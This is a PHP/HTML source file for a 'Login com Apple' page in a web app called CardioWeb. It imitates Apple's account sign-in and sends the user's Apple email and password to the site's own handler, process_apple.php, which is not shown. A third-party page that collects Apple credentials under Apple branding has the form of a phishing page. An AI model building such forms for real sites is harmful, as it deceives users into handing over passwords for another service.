<?php
session_start();
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login com Apple - CardioWeb</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f5f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container { width: 100%; max-width: 450px; padding: 20px; }
        .card {
            background: white;
            border-radius: 12px;
            box-shadow: 0 2px 20px rgba(0,0,0,0.1);
            padding: 40px;
        }
        .apple-logo { text-align: center; margin-bottom: 32px; }
        .apple-logo i { font-size: 56px; color: #000; }
        h1 { font-size: 28px; text-align: center; margin-bottom: 8px; color: #1d1c1e; }
        .subtitle { text-align: center; color: #6c6c70; margin-bottom: 32px; font-size: 16px; }
        .input-group { margin-bottom: 20px; }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #e5e5ea;
            border-radius: 10px;
            font-size: 16px;
            background: #f9f9fb;
        }
        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 10px;
            font-size: 17px;
            font-weight: 500;
            cursor: pointer;
            background: #007aff;
            color: white;
        }
        .btn:hover { background: #005fc5; }
        .back-link {
            display: block;
            text-align: center;
            margin-top: 24px;
            color: #6c6c70;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="apple-logo"><i class="fab fa-apple"></i></div>
            <h1>Apple Account</h1>
            <p class="subtitle">Use sua Apple Account para entrar no CardioWeb</p>
            <form action="process_apple.php" method="POST">
                <div class="input-group"><input type="email" name="email" placeholder="E-mail ou telefone" required></div>
                <div class="input-group"><input type="password" name="password" placeholder="Senha" required></div>
                <button type="submit" class="btn">Continuar</button>
            </form>
            <a href="index.php" class="back-link">← Voltar ao login</a>
        </div>
    </div>
</body>
</html>